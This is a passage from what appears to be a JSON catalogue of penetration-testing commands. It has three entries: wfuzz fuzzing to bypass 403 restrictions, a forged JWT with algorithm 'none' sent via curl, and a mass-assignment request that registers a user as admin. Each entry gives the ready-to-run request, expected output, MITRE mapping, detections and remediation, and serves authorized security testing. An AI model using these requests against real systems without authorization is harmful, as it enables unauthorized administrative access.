  {
    "id": "wfuzz-auth-bypass",
    "tool": "wfuzz",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux"
    ],
    "command": "wfuzz -c -z file,/usr/share/seclists/Fuzzing/Unicode.txt -u http://<target>/admin/FUZZ --hc 403",
    "name": "Path Traversal / Auth Bypass Fuzzing",
    "description": "Fuzzes URL paths with Unicode and special characters to bypass access controls.",
    "arguments": {
      "-z file": "Payload source",
      "--hc 403": "Hide 403 (blocked)"
    },
    "expected_output": "200  /admin/%2e%2e/config\n200  /admin/..;/dashboard",
    "use_case": "Bypass 403 restrictions using path normalization tricks.",
    "prerequisites": [
      "403 on restricted path"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "Unusual URL encoding in logs",
      "Path traversal patterns"
    ],
    "remediation": [
      "Normalize paths before ACL check",
      "Use allowlists"
    ],
    "common_mistakes": [
      "All bypasses blocked"
    ],
    "alternatives": [
      "403bypasser",
      "byp4xx"
    ],
    "references": [
      "https://github.com/xmendez/wfuzz"
    ],
    "tags": [
      "auth-bypass",
      "403",
      "path-traversal",
      "unicode",
      "fuzzing"
    ]
  },
  {
    "id": "api-jwt-none",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "# Change JWT header algorithm to 'none':\n# {\"alg\":\"none\",\"typ\":\"JWT\"}\n# Remove signature\ncurl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' http://<target>/api/admin",
    "name": "JWT Algorithm None Attack",
    "description": "Exploits JWT implementations that accept 'none' algorithm \u2014 bypasses signature verification.",
    "arguments": {
      "alg: none": "No signature required"
    },
    "expected_output": "{\n  \"status\": \"success\",\n  \"user\": \"admin\"\n}",
    "use_case": "Bypass JWT authentication by setting algorithm to 'none' \u2014 removes signature requirement.",
    "prerequisites": [
      "JWT-based authentication",
      "Server accepts 'none' algorithm"
    ],
    "mitre_mapping": [
      "T1078"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "JWT with 'none' algorithm",
      "Missing signature"
    ],
    "remediation": [
      "Reject 'none' algorithm",
      "Validate algorithm server-side"
    ],
    "common_mistakes": [
      "Server properly validates algorithm"
    ],
    "alternatives": [
      "jwt_tool -T",
      "manual base64 editing"
    ],
    "references": [
      "https://portswigger.net/web-security/jwt"
    ],
    "tags": [
      "jwt",
      "none",
      "algorithm",
      "bypass",
      "authentication"
    ]
  },
  {
    "id": "api-mass-assignment",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl -X POST http://<target>/api/register -H 'Content-Type: application/json' -d '{\"username\":\"hacker\",\"password\":\"pass\",\"role\":\"admin\",\"isAdmin\":true}'",
    "name": "Mass Assignment / Parameter Pollution",
    "description": "Adds extra parameters to requests hoping the backend blindly assigns them to the object.",
    "arguments": {
      "role: admin": "Extra parameter",
      "isAdmin: true": "Another attempt"
    },
    "expected_output": "{\n  \"id\": 5,\n  \"username\": \"hacker\",\n  \"role\": \"admin\"\n}",
    "use_case": "Escalate privileges by adding hidden parameters that the API blindly accepts.",
    "prerequisites": [
      "API endpoint accepting JSON",
      "Knowledge of internal field names"
    ],
    "mitre_mapping": [
      "T1078"
    ],
    "mitre_tactic": "Privilege Escalation",
    "detections": [
      "Unexpected fields in request bodies",
      "Role changes without admin action"
    ],
    "remediation": [
      "Use DTOs/allowlists for input",
      "Never bind request directly to model"
    ],
    "common_mistakes": [
      "API properly validates fields"
    ],
    "alternatives": [
      "arjun (find hidden params)",
      "param-miner (Burp)"
    ],
    "references": [
      "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"
    ],
    "tags": [
      "mass-assignment",
      "api",
      "privilege-escalation",
      "parameters"
    ]
  }
]